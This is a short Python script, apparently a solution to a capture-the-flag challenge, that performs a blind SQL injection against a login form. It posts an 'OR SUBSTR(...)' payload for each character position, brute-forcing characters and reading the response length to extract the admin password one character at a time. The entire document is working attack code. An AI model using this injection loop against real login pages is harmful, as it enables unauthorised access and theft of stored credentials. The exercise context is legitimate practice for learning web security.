import requests

url = "http://ctfq.sweetduet.info:10080/~q6/"
num = 22
for index in range(1,num):
    for num in range(48,123):
        char = chr(num)
        sql = "'OR SUBSTR((SELECT pass FROM user WHERE id= \'admin\'),{index},1) = \'{char}\' --'".format(index = index, char = char)
        payload = {
            "id":"admin",
            "pass":sql
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000:
            print(char,end="")
            break
print()
